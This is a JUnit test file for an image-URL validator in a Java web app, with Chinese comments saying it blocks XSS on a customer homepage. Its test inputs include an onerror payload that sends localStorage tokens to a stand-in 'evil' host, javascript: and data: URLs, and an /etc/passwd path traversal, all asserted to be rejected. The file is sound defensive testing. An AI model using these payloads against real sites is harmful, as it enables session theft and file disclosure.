package com.example.demo.common;

import com.example.demo.exception.CustomException;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;

/**
 * 純邏輯測試（不載入 Spring context）。
 *
 * <p>守住的是「店家封面／品牌 logo 這類字串只能是自己人送的」這條規則：
 * 一旦有人把引號或 javascript: 放進來，顧客端就會把它當成 HTML 屬性的一部分執行。
 */
class SafeImageUrlTest {

    @Test
    @DisplayName("站內相對路徑與 http(s) 網址可通過")
    void allowsInternalPathAndHttpUrls() {
        assertEquals("/uploads/stores/abc.png", SafeImageUrl.normalize("/uploads/stores/abc.png"));
        assertEquals("https://res.cloudinary.com/demo/image/upload/v1/x.png",
                SafeImageUrl.normalize("https://res.cloudinary.com/demo/image/upload/v1/x.png"));
        assertEquals("http://localhost:8082/uploads/a.jpg", SafeImageUrl.normalize("http://localhost:8082/uploads/a.jpg"));
    }

    @Test
    @DisplayName("null 與空白視為未設定")
    void keepsNullAndBlankAsNull() {
        assertNull(SafeImageUrl.normalize(null));
        assertNull(SafeImageUrl.normalize(""));
        assertNull(SafeImageUrl.normalize("   "));
    }

    @Test
    @DisplayName("雙引號跳出屬性必須被拒（顧客首頁 XSS 的成因）")
    void rejectsQuoteBreakout() {
        assertThrows(CustomException.class,
                () -> SafeImageUrl.normalize("x\" onerror=\"fetch('https://evil/?t='+localStorage.token)"));
        assertThrows(CustomException.class, () -> SafeImageUrl.normalize("x' onerror='alert(1)"));
        assertThrows(CustomException.class, () -> SafeImageUrl.normalize("x\"><img src=x onerror=alert(1)>"));
    }

    @Test
    @DisplayName("非 http(s) 的 scheme 一律拒絕")
    void rejectsDangerousSchemes() {
        assertThrows(CustomException.class, () -> SafeImageUrl.normalize("javascript:alert(1)"));
        assertThrows(CustomException.class, () -> SafeImageUrl.normalize("data:text/html;base64,PHNjcmlwdD4="));
        assertThrows(CustomException.class, () -> SafeImageUrl.normalize("blob:https://x/abc"));
        assertThrows(CustomException.class, () -> SafeImageUrl.normalize("uploads/a.png"));
    }

    @Test
    @DisplayName("協定相對網址與路徑穿越必須被拒")
    void rejectsProtocolRelativeAndTraversal() {
        assertThrows(CustomException.class, () -> SafeImageUrl.normalize("//evil.example/x.png"));
        assertThrows(CustomException.class, () -> SafeImageUrl.normalize("/uploads/../../etc/passwd"));
    }

    @Test
    @DisplayName("空白與控制字元必須被拒（屬性會被切斷）")
    void rejectsWhitespaceAndControlChars() {
        assertThrows(CustomException.class, () -> SafeImageUrl.normalize("/uploads/a b.png"));
        assertThrows(CustomException.class, () -> SafeImageUrl.normalize("/uploads/a\nb.png"));
        assertThrows(CustomException.class, () -> SafeImageUrl.normalize("/uploads/a\u0000b.png"));
    }

    @Test
    @DisplayName("超長字串必須被拒")
    void rejectsOverlongValue() {
        assertThrows(CustomException.class, () -> SafeImageUrl.normalize("/uploads/" + "a".repeat(600)));
    }
}
